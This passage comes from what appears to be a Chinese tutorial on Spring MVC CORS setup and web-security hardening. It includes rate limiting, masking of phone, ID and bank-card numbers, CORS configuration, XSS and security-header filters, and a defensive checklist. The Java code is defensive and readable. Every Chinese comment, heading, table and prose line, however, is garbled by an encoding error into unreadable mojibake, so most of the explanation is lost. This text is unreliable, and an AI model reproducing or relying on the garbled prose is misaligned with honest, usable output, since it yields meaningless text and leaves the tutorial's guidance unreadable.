    int value() default 10; // æ¯ç§’è¯·æ±‚æ•°
}

@RateLimit(5)  // æ¯ç§’æœ€å¤š5æ¬¡
@PostMapping("/login")
public String login(@RequestBody LoginDTO dto) {
    return "ç™»å½•æˆåŠŸ";
}
```

### 5.2 æ•æ„Ÿæ•°æ®è„±æ•


```java
public class SensitiveDataUtil {
    
    // æ‰‹æœºå·è„±æ•ï¼š138****5678
    public static String maskPhone(String phone) {
        if (phone == null || phone.length() != 11) {
            return phone;
        }
        return phone.substring(0, 3) + "****" + phone.substring(7);
    }
    
    // èº«ä»½è¯è„±æ•ï¼š110101********1234
    public static String maskIdCard(String idCard) {
        if (idCard == null || idCard.length() < 15) {
            return idCard;
        }
        return idCard.substring(0, 6) + "********" + 
               idCard.substring(idCard.length() - 4);
    }
    
    // é“¶è¡Œå¡è„±æ•ï¼š6222 **** **** 1234
    public static String maskBankCard(String card) {
        if (card == null || card.length() < 16) {
            return card;
        }
        return card.substring(0, 4) + " **** **** " + 
               card.substring(card.length() - 4);
    }
}
```

### 5.3 å®Œæ•´çš„å®‰å…¨é…ç½®ç¤ºä¾‹


```java
@Configuration
public class WebSecurityConfig implements WebMvcConfigurer {
    
    @Autowired
    private RateLimitInterceptor rateLimitInterceptor;
    
    // 1. é…ç½®è·¨åŸŸ
    @Override
    public void addCorsMappings(CorsRegistry registry) {
        registry.addMapping("/api/**")
                .allowedOrigins("http://localhost:8080")
                .allowedMethods("GET", "POST", "PUT", "DELETE")
                .allowCredentials(true)
                .maxAge(3600);
    }
    
    // 2. é…ç½®æ‹¦æˆªå™¨ï¼ˆè¯·æ±‚é¢‘ç‡é™åˆ¶ï¼‰
    @Override
    public void addInterceptors(InterceptorRegistry registry) {
        registry.addInterceptor(rateLimitInterceptor)
                .addPathPatterns("/api/**");
    }
    
    // 3. XSSè¿‡æ»¤å™¨
    @Bean
    public FilterRegistrationBean<XssFilter> xssFilterRegistration() {
        FilterRegistrationBean<XssFilter> registration = new FilterRegistrationBean<>();
        registration.setFilter(new XssFilter());
        registration.addUrlPatterns("/*");
        registration.setName("xssFilter");
        registration.setOrder(1);
        return registration;
    }
    
    // 4. å®‰å…¨å“åº”å¤´
    @Bean
    public FilterRegistrationBean<SecurityHeaderFilter> securityHeaderFilter() {
        FilterRegistrationBean<SecurityHeaderFilter> registration = new FilterRegistrationBean<>();
        registration.setFilter(new SecurityHeaderFilter());
        registration.addUrlPatterns("/*");
        registration.setOrder(2);
        return registration;
    }
}

// å®‰å…¨å“åº”å¤´è¿‡æ»¤å™¨
class SecurityHeaderFilter implements Filter {
    @Override
    public void doFilter(ServletRequest req, ServletResponse res, 
                        FilterChain chain) throws IOException, ServletException {
        
        HttpServletResponse response = (HttpServletResponse) res;
        
        // é˜²æ­¢ç‚¹å‡»åŠ«æŒ
        response.setHeader("X-Frame-Options", "DENY");
        
        // é˜²æ­¢XSS
        response.setHeader("X-XSS-Protection", "1; mode=block");
        
        // ç¦æ­¢MIMEç±»å‹å—…æ¢
        response.setHeader("X-Content-Type-Options", "nosniff");
        
        // HTTPSå¼ºåˆ¶
        response.setHeader("Strict-Transport-Security", 
            "max-age=31536000; includeSubDomains");
        
        chain.doFilter(req, res);
    }
}
```

---

## 6. ğŸ“‹ æ ¸å¿ƒè¦ç‚¹æ€»ç»“


### 6.1 è·¨åŸŸé—®é¢˜æ ¸å¿ƒç†è§£


```
ğŸ”¸ æœ¬è´¨ï¼šæµè§ˆå™¨çš„åŒæºç­–ç•¥ä¿æŠ¤æœºåˆ¶
ğŸ”¸ åˆ¤æ–­ï¼šåè®®ã€åŸŸåã€ç«¯å£ï¼Œä¸‰è€…å…¨åŒæ‰ç®—åŒæº
ğŸ”¸ è§£å†³ï¼šCORSæ˜¯å®˜æ–¹æ ‡å‡†çš„è·¨åŸŸè§£å†³æ–¹æ¡ˆ
ğŸ”¸ ä¸¤ç§è¯·æ±‚ï¼šç®€å•è¯·æ±‚ç›´æ¥å‘é€ï¼Œå¤æ‚è¯·æ±‚éœ€è¦é¢„æ£€
```

### 6.2 SpringMVCè·¨åŸŸæ–¹æ¡ˆé€‰æ‹©


| åœºæ™¯ | æ¨èæ–¹æ¡ˆ | ç†ç”± |
|------|----------|------|
| å¼€å‘ç¯å¢ƒ | å…¨å±€é…ç½® | ç®€å•å¿«æ·ï¼Œç»Ÿä¸€ç®¡ç† |
| ç”Ÿäº§ç¯å¢ƒ | @CrossOriginç²¾ç¡®æ§åˆ¶ | å®‰å…¨æ€§é«˜ï¼ŒæŒ‰éœ€å¼€æ”¾ |
| å¤æ‚é€»è¾‘ | è‡ªå®šä¹‰è¿‡æ»¤å™¨ | çµæ´»åº¦æœ€é«˜ |

### 6.3 Webå®‰å…¨é˜²æŠ¤è¦ç‚¹


**CSRFé˜²æŠ¤**ï¼š
- âœ… ä½¿ç”¨CSRF Token
- âœ… æ£€æŸ¥Refererå¤´
- âœ… ä½¿ç”¨SameSite Cookie

**XSSé˜²æŠ¤**ï¼š
- âœ… è¾“å‡ºæ—¶HTMLè½¬ä¹‰
- âœ… è®¾ç½®CSPç­–ç•¥
- âœ… ä½¿ç”¨HttpOnly Cookie

**SQLæ³¨å…¥é˜²æŠ¤**ï¼š
- âœ… æ°¸è¿œä½¿ç”¨å‚æ•°åŒ–æŸ¥è¯¢
- âœ… ä¸è¦æ‹¼æ¥SQLè¯­å¥
- âœ… éªŒè¯è¾“å…¥æ ¼å¼

**æ–‡ä»¶ä¸Šä¼ å®‰å…¨**ï¼š
- âœ… é™åˆ¶æ–‡ä»¶å¤§å°å’Œç±»å‹
- âœ… é‡å‘½åä¸Šä¼ æ–‡ä»¶
- âœ… å­˜å‚¨åœ¨Webç›®å½•å¤–
- âœ… ç¦æ­¢è„šæœ¬æ‰§è¡Œæƒé™

### 6.4 å®‰å…¨å¼€å‘æ£€æŸ¥æ¸…å•


- [x] æ‰€æœ‰å¯¹å¤–æ¥å£éƒ½é…ç½®äº†è·¨åŸŸç­–ç•¥
- [x] æ•æ„Ÿæ“ä½œä½¿ç”¨äº†CSRF Token
- [x] æ‰€æœ‰ç”¨æˆ·è¾“å…¥éƒ½è¿›è¡Œäº†è½¬ä¹‰
- [x] æ•°æ®åº“æŸ¥è¯¢ä½¿ç”¨å‚æ•°åŒ–
- [x] æ–‡ä»¶ä¸Šä¼ æœ‰ä¸¥æ ¼çš„ç±»å‹å’Œå¤§å°é™åˆ¶
- [x] é‡è¦æ¥å£æœ‰è¯·æ±‚é¢‘ç‡é™åˆ¶
- [x] æ•æ„Ÿæ•°æ®è¿›è¡Œäº†è„±æ•å¤„ç†
- [x] å“åº”å¤´è®¾ç½®äº†å®‰å…¨ç­–ç•¥

> ğŸ’¡ **å®‰å…¨é“å¾‹**  
> æ°¸è¿œä¸è¦ä¿¡ä»»ç”¨æˆ·è¾“å…¥ï¼æ‰€æœ‰å¤–éƒ¨æ•°æ®éƒ½è¦éªŒè¯ã€è¿‡æ»¤ã€è½¬ä¹‰ã€‚

**è®°å¿†å£è¯€**ï¼š
```
è·¨åŸŸCORSå¤´ä¸­é…ï¼Œç®€å•å¤æ‚è¦åˆ†å¼€
CSRF TokenéªŒèº«ä»½ï¼ŒXSSè½¬ä¹‰é˜²æ³¨å…¥  
SQLå‚æ•°ä¸æ‹¼æ¥ï¼Œæ–‡ä»¶ä¸Šä¼ ä¸¥æŠŠå…³
å®‰å…¨é˜²æŠ¤æ— å°äº‹ï¼Œå±‚å±‚è®¾é˜²ä¿å¹³å®‰
```